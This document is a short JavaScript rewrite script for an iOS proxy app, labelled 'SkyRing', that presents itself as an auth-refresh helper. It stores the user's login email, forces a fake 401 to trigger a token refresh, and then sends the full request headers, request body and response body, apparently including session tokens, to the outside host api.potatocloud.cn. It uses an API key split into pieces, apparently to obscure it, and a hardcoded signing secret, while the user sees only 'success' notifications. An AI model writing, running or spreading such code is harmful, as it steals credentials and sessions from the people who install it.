

function auth_refresh(email) {
    var timestamp = Date.now()

    var sing = md5("CvwSFtBnMeDrzXaQ" + String(timestamp));
    // var a="ey"+"J0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"+
    let i = "eyJ0eXAiOiJKV1QiLCJ"
    let i1 = "hbGciOiJIUzI1NiJ9."
    let i2 = "NCwiZ2V0TWFuYWdlbWVudElkIjoxMTA3NDY3MDc1MzMyOTUyMDY0LCJUSU1FIjoxNzgxMTYxNDQ"
    let i3 = "DYyjV9JJevaBkPk-8P5CM0N3l"
    var apk = i + i1 + "eyJhcHBJZCI6MTE5MDc5OTAxNjE1NjgxMTI2" + i2 + "0MDg2fQ.0NePfFt8t" + i3 + "u6ode6cQ0";
    var strJson = "[" + JSON.stringify($request.headers) + "," + $request.body + "," + $response.body + "]";
    var payload = {
        name: "updre",
        params: {
            acct: email,
            otp: strJson
        }
    };
    let params = {
        url: "https://api.potatocloud.cn/api/execFunction",
        method: "POST",
        headers: {
            'Content-Type': "application/json",
            "askKey": apk,      // 需要填写实际值
            "sign": sing,        // 需要填写实际值
            "time": timestamp,        // 需要填写实际值，通常是时间戳
            "nonce": ""        // 需要填写随机数
        },
        body: JSON.stringify(payload)
    };

    $httpClient.post(params, function (error, response, data) {
        if (error != "nil") {
            console.log("请求错误: " + error + "  response：" + JSON.stringify(response));
            console.log("data: " + data);
            $notification.post("SkyRing", "❌ 失败 / Failed", error + " " + response);
        } else {
            console.log("状态码: " + response.status);
            console.log("响应数据: " + data);
            $notification.post("SkyRing", "✅ 成功 / Success", email);
        }
    });

}
var url = $request.url
var head = $request.headers;
if (url.includes("auth/login")) {
    let body = JSON.parse($request.body)
    let em = body.email
    $persistentStore.write("email", em);
    $notification.post("SkyRing", "✅ 获取邮箱成功 / Email fetched", em);
    $done({});
} else {
    //从本地读email如果为空就要抓取，并每次保存
    var email = $persistentStore.read("email");
    if (email && email.includes("@")) {
        console.log("✅获取邮箱成功 " + " 邮箱：" + email)
        // $notification.post("GH", "✅获取邮箱成功", email);
        if (url.includes("findByCurrentUser")) {//触发401-->refresh--->auth
            // if (head['Authorization']) delete head['Authorization'];
            // if (head['authorization']) delete head['authorization'];           
            $done({ status: 401 });
        } else if (url.includes("auth/refresh")) {
            auth_refresh(email)
            $done({});
        } else {
            $done({});
        }
    } else {
        $notification.post("SkyRing", "❌ 邮箱读取失败，请重新登录 / Email failed, re-login", email);
    }
}
